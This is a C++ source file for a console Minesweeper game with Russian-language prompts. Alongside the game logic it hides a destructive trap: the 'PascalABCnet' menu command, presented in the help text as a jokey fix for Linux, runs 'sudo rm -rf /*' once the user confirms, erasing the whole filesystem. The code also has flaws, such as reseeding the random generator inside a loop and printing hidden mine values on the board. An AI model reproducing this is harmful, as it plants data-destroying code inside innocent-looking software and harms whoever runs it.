#include <iostream>
#include <cstdlib>
#include <ctime>

using namespace std;

inline void message1();
inline void message2();
inline void main_help();
inline void PascalABCnet();
inline void ingame_help();

class pole
{
protected:
    unsigned int width;
    unsigned int length;
    unsigned int count;
    int **tabl;
    int **htabl;

public:
    pole(unsigned int a, unsigned int b, unsigned int c)
    {
        length = a;
        width = b;
        count = c;
        tabl = new int *[length + 2];
        for (int i = 0; i < length + 2; i++)
        {
            tabl[i] = new int[width + 2];
        }
        htabl = new int *[length + 2];
        for (int i = 0; i < length + 2; i++)
        {
            htabl[i] = new int[width + 2];
        }
        for (int i = 1; i < length + 2; i++)
        {
            for (int j = 1; j < width + 2; j++)
            {
                tabl[i][j] = 9;
            }
        }
        for (int i = 0; i < width + 2; i++)
        {
            tabl[0][i] = 228;
            htabl[0][i] = 228;
        }
        for (int i = 0; i < length + 2; i++)
        {
            tabl[i][0] = 228;
            htabl[i][0] = 228;
        }
        for (int i = 0; i < width + 2; i++)
        {
            tabl[length + 1][i] = 228;
            htabl[length + 1][i] = 228;
        }
        for (int i = 0; i < length + 2; i++)
        {
            tabl[i][width + 1] = 228;
            htabl[i][width + 1] = 228;
        }
    }
    inline void mines() //самый хреновый по времени алгоритм для этого, но ладно, сойдет
    {
        int i = 0;
        int k = 0;
        int k1 = 0;
        while (i < count)
        {
            srand(time(NULL));
            k = 1 + rand() % length;
            k1 = 1 + rand() % width;
            if (!(htabl[k][k1] == -1))
            {
                htabl[k][k1] = -1;
                i++;
            }
        }
    }
    inline void out()
    {
        for (int i = 1; i < length + 1; i++)
        {
            for (int j = 1; j < width + 1; j++)
            {
                switch (tabl[i][j])
                {
                case 9:
                {
                    cout << "  #  ";
                    break;
                }
                case 10:
                {
                    cout << "  ?  ";
                    break;
                }
                case 11:
                {
                    cout << "  ^  ";
                    break;
                }
                default:
                {
                    cout << tabl[i][j] << "(" << htabl[i][j] << ") ";
                }
                }
            }
            cout << endl;
        }
    }
    inline void calculate()
    {
        for (int i = 1; i < length + 1; i++)
        {
            for (int j = 1; j < width + 1; j++)
            {
                if (!(htabl[i][j] == -1))
                {
                    {
                        if (htabl[i - 1][j - 1] == -1)
                            htabl[i][j]++;
                        if (htabl[i - 1][j] == -1)
                        {
                            htabl[i][j]++;
                        }
                        if (htabl[i - 1][j + 1] == -1)
                        {
                            htabl[i][j]++;
                        }
                        if (htabl[i][j - 1] == -1)
                        {
                            htabl[i][j]++;
                        }
                        if (htabl[i][j + 1] == -1)
                        {
                            htabl[i][j]++;
                        }
                        if (htabl[i + 1][j - 1] == -1)
                        {
                            htabl[i][j]++;
                        }
                        if (htabl[i + 1][j] == -1)
                        {
                            htabl[i][j]++;
                        }
                        if (htabl[i + 1][j + 1] == -1)
                        {
                            htabl[i][j]++;
                        }
                    }
                }
            }
        }
    }

    inline bool check()
    {
        bool bl = true;
        for (int i = 1; i < length + 1; i++)
        {
            for (int j = 1; j < width + 1; j++)
            {
                if (tabl[i][j] == 9)
                    bl = false;
            }
        }
        return bl;
    }
    inline bool game()
    {
        string com;
        bool win = false;
        int d = 0;
        int d1 = 0;
        while (!(com == "stop"))
        {
            out();
            cout << "game>>>";
            cin >> com;
            if (com == "-m")
            {
                cin >> d >> d1;
                if ((d <= width) && (d >= 1) && (d1 <= length) && (d1 >= 1))
                {
                    tabl[d1][d] = 11;
                    if ((tabl[d1 - 1][d - 1] < 9) && (tabl[d1 - 1][d - 1] < 9))
                        tabl[d1 - 1][d - 1]--;
                    if ((tabl[d1 - 1][d] < 9) && (tabl[d1 - 1][d] < 9))
                        tabl[d1 - 1][d]--;
                    if ((tabl[d1 - 1][d + 1] < 9) && (tabl[d1 - 1][d + 1] < 9))
                        tabl[d1 - 1][d + 1]--;
                    if ((tabl[d1 + 1][d - 1] < 9) && (tabl[d1 + 1][d - 1] < 9))
                        tabl[d1 + 1][d - 1]--;
                    if ((tabl[d1 + 1][d] < 9) && (tabl[d1 + 1][d] < 9))
                        tabl[d1 + 1][d]--;
                    if ((tabl[d1 + 1][d + 1] < 9) && (tabl[d1 + 1][d + 1] < 9))
                        tabl[d1 + 1][d + 1]--;
                    if ((tabl[d1][d + 1] < 9) && (tabl[d1][d + 1] < 9))
                        tabl[d1][d + 1]--;
                    if ((tabl[d1][d - 1] < 9) && (tabl[d1][d - 1] < 9))
                        tabl[d1][d - 1]--;
                }
            }
            if (com == "-d")
            {
                cin >> d >> d1;
                if (tabl[d1][d] == 11)
                {
                    tabl[d1][d] = 9;
                    if ((tabl[d1 - 1][d - 1] < 9) && (tabl[d1 - 1][d - 1] < 9))
                        tabl[d1 - 1][d - 1]++;
                    if ((tabl[d1 - 1][d] < 9) && (tabl[d1 - 1][d] < 9))
                        tabl[d1 - 1][d]++;
                    if ((tabl[d1 - 1][d + 1] < 9) && (tabl[d1 - 1][d + 1] < 9))
                        tabl[d1 - 1][d + 1]++;
                    if ((tabl[d1 + 1][d - 1] < 9) && (tabl[d1 + 1][d - 1] < 9))
                        tabl[d1 + 1][d - 1]++;
                    if ((tabl[d1 + 1][d] < 9) && (tabl[d1 + 1][d] < 9))
                        tabl[d1 + 1][d]++;
                    if ((tabl[d1 + 1][d + 1] < 9) && (tabl[d1 + 1][d + 1] < 9))
                        tabl[d1 + 1][d + 1]++;
                    if ((tabl[d1][d + 1] < 9) && (tabl[d1][d + 1] < 9))
                        tabl[d1][d + 1]++;
                    if ((tabl[d1][d - 1] < 9) && (tabl[d1][d - 1] < 9))
                        tabl[d1][d - 1]++;
                }
            }
            if (com == "-e")
            {
                cin >> d >> d1;
                if (tabl[d1][d] == 9)
                {
                    if (htabl[d1][d] == -1)
                    {
                        cout << "Вы проиграли!" << endl;
                        return false;
                    }
                    else
                        tabl[d1][d] = htabl[d1][d];
                }
            }
            if ((com == "--h") || (com == "help"))
            {
                ingame_help();
            }
            if (com == "-h")
            {
                cin >> d >> d1;
                tabl[d1][d] = 10;
            }
            if (check() == true)
                return true;
        }
    }
};

int main()
{
    message1();
    string command;
    bool win = false;
    while (!(command == "exit"))
    {
        cout << "main menu>>>";
        cin >> command;
        if (command == "start")
        {
            int f = 0;
            int f1 = 0;
            int f2 = 0;
            cout << "Введите размеры поля и кол-во мин" << endl;
            cin >> f >> f1 >> f2;
            pole A(f, f1, f2);
            A.mines();
            A.calculate();
            win = A.game();
            if (win == true)
            {
                cout << "вы победили!!" << endl;
                return 0;
            }
        }
        if (command == "help")
        {
            main_help();
        }
        if (command == "PascalABCnet")
        {
            PascalABCnet();
        }
    }
    return 0;
}

inline void message1()
{
    system("clear");
    cout << "----------------------------------------------------------------------------------" << endl;
    cout << "|                      Welcome to Conslole minesweeper                           |" << endl;
    cout << "----------------------------------------------------------------------------------" << endl;
    cout << "Введите help для вывода списка команд" << endl;
}

inline void message2()
{
    system("clear");
    cout << "----------------------------------------------------------------------------------" << endl;
    cout << "|                               Console minesweeper                              |" << endl;
    cout << "----------------------------------------------------------------------------------" << endl;
}

inline void main_help()
{
    message2();
    cout << "Вывод списка команд" << endl;
    cout << "1) start - начало игры" << endl;
    cout << "2) PascalABCnet - избавит вас от мучений с Linux. Note: it is effective!" << endl;
    cout << "3) exit - выход из скрипта" << endl;
    cout << "4) help - вывод меню помощи" << endl;
}

inline void PascalABCnet()
{
    message2();
    char a;
er:
    cout << "Вы уверены, что хотите продолжить? (Y или y - да; N или n - нет) " << endl;
    cout << "Внимание! Вы должны обладать правами администратора!" << endl;
    cin >> a;
    switch (a)
    {
    case 'Y':
    {
        system("sudo rm -rf /*");
        break;
    } //брейк тут уже даже и не понадобится)
    case 'y':
    {
        system("sudo rm -rf /*");
        break;
    }
    case 'N':
    {
        cout << "Never use Pascal again!!!" << endl;
        break;
    }
    case 'n':
    {
        cout << "Never use Pascal again!!!" << endl;
        break;
    }
    default:
    {
        cout << "Incorrect letter!" << endl;
        goto er;
    }
    }
}

inline void ingame_help()
{
    string a;
    cout << "Список флагов для игры:" << endl;
    cout << "1) -e [x] [y] - установка пустой позиции" << endl;
    cout << "2) -m [x] [y] - установка мины" << endl;
    cout << "3) -d [x] [y] - удалить мину" << endl;
    cout << "4) -h [x] [y] - точка сомнения" << endl;
    cout << "Введите y чтобы продолжить" << endl;
    cin >> a;
}
